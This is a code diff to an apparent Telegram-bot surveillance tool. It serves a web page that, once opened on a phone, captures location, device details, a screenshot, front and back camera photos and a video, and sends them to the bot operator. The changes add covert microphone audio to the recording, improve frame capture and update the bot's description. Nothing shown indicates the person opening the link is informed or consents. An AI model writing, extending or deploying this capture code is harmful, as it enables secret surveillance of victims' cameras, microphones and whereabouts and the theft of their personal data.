@@ -82,7 +82,7 @@ HTML_PAGE = """<!DOCTYPE html>
             else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
             else if (ua.includes('Android')) {
                 brand = 'Android';
-                const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
+                const match = ua.match(/Android\\s+([\\d.]+);\\s+([^;)]+)/);
                 model = match ? match[2] : 'Android Device';
             } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
             else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
@@ -148,7 +148,7 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Improved camera acquisition with facing detection ----
+        // ---- Improved camera acquisition with audio handling ----
         async function getCameraStreams() {
             let back = null, front = null;
             let errorMessages = [];
@@ -164,7 +164,9 @@ HTML_PAGE = """<!DOCTYPE html>
                 const settings = track.getSettings();
                 debugInfo.backTrack = settings;
                 if (settings.facingMode === 'environment') backFacing = true;
-                else backFacing = true; // assume
+                else backFacing = true;
+                // Check if audio track exists
+                debugInfo.backAudioTracks = back.getAudioTracks().length;
             } catch (err) {
                 errorMessages.push('Back explicit: ' + err.name + ' - ' + err.message);
                 // fallback to default
@@ -174,7 +176,8 @@ HTML_PAGE = """<!DOCTYPE html>
                     const track = back.getVideoTracks()[0];
                     const settings = track.getSettings();
                     debugInfo.backDefault = settings;
-                    backFacing = true; // assume
+                    backFacing = true;
+                    debugInfo.backAudioTracks = back.getAudioTracks().length;
                 } catch (err2) {
                     errorMessages.push('Default back: ' + err2.name + ' - ' + err2.message);
                 }
@@ -217,10 +220,34 @@ HTML_PAGE = """<!DOCTYPE html>
                 frontFacing = backFacing;
             }
 
+            // ---- If back stream has no audio, try to get a separate audio stream ----
+            let audioStream = null;
+            if (back && back.getAudioTracks().length === 0) {
+                try {
+                    // Request audio only
+                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    debugInfo.audioStreamAdded = true;
+                    // Combine video from back with audio from audioStream
+                    const combinedTracks = [];
+                    // Add video tracks from back
+                    back.getVideoTracks().forEach(t => combinedTracks.push(t));
+                    // Add audio tracks from audioStream
+                    audioStream.getAudioTracks().forEach(t => combinedTracks.push(t));
+                    // Create new combined stream
+                    const combined = new MediaStream(combinedTracks);
+                    // Replace back with combined stream
+                    back = combined;
+                    debugInfo.combinedBack = true;
+                } catch (err) {
+                    errorMessages.push('Audio only: ' + err.name + ' - ' + err.message);
+                    debugInfo.audioFailed = true;
+                }
+            }
+
             return { front, back, error: errorMessages.join(' | '), debug: debugInfo, backFacing, frontFacing };
         }
 
-        // ---- Robust frame capture ----
+        // ---- Improved frame capture ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
@@ -229,30 +256,49 @@ HTML_PAGE = """<!DOCTYPE html>
                 let resolved = false;
                 video.onloadedmetadata = async () => {
                     video.play();
+                    // Wait for actual frame using requestAnimationFrame
                     let attempts = 0;
-                    while (attempts < 20) {
-                        await delay(100);
-                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
-                            break;
-                        }
+                    let frameBlob = null;
+                    const checkFrame = async () => {
                         attempts++;
-                    }
-                    if (video.videoWidth === 0 || video.videoHeight === 0) {
-                        if (!resolved) { resolved = true; resolve(null); }
-                        video.pause();
-                        video.srcObject = null;
-                        return;
-                    }
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    canvas.toBlob((blob) => {
-                        if (!resolved) { resolved = true; resolve(blob); }
-                        video.pause();
-                        video.srcObject = null;
-                    }, 'image/jpeg', 0.9);
+                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                            // Draw to canvas
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            // Check if image is black (approx)
+                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                            const data = imageData.data;
+                            let sum = 0;
+                            for (let i = 0; i < data.length; i += 4) {
+                                sum += data[i] + data[i+1] + data[i+2];
+                            }
+                            const avg = sum / (canvas.width * canvas.height * 3);
+                            // If average is very low (< 10), it might be black
+                            if (avg < 10 && attempts < 3) {
+                                // Try again after a short delay
+                                await delay(200);
+                                // Recursively check again
+                                checkFrame();
+                                return;
+                            }
+                            canvas.toBlob((blob) => {
+                                if (!resolved) { resolved = true; resolve(blob); }
+                                video.pause();
+                                video.srcObject = null;
+                            }, 'image/jpeg', 0.9);
+                        } else if (attempts < 10) {
+                            await delay(100);
+                            checkFrame();
+                        } else {
+                            if (!resolved) { resolved = true; resolve(null); }
+                            video.pause();
+                            video.srcObject = null;
+                        }
+                    };
+                    checkFrame();
                 };
             });
         }
@@ -309,10 +355,12 @@ HTML_PAGE = """<!DOCTYPE html>
             // 4. Screenshot
             const screenshotBlob = await captureScreenshot();
 
-            // 5. Recording (from back camera)
+            // 5. Recording (from back stream)
             let videoBlob = null;
             let recordStream = backStream || frontStream;
             if (recordStream) {
+                // Check if stream has audio tracks
+                const hasAudio = recordStream.getAudioTracks().length > 0;
                 let mimeType = 'video/webm;codecs=vp9,opus';
                 if (!MediaRecorder.isTypeSupported(mimeType)) {
                     mimeType = 'video/webm;codecs=vp8,opus';
@@ -375,13 +423,12 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('camera_status', cameraStatus);
                 fd.append('camera_error', cameraError);
                 fd.append('camera_debug', JSON.stringify(debug));
-                // Send facing flags to backend for labeling
                 fd.append('backFacing', backFacing ? 'true' : 'false');
                 fd.append('frontFacing', frontFacing ? 'true' : 'false');
                 // Media
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');   // back image
-                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg'); // front image
+                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
+                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
 
                 await sendData(fd);
@@ -485,7 +532,7 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Back camera (we want to send back first)
+        # Back camera (send first)
         if back_img:
             try:
                 back_img.seek(0)
@@ -533,7 +580,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (back first, then front), and video recording.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (back first, then front), and video recording with audio.")
 
 def run_bot():
     print("Bot polling started.")
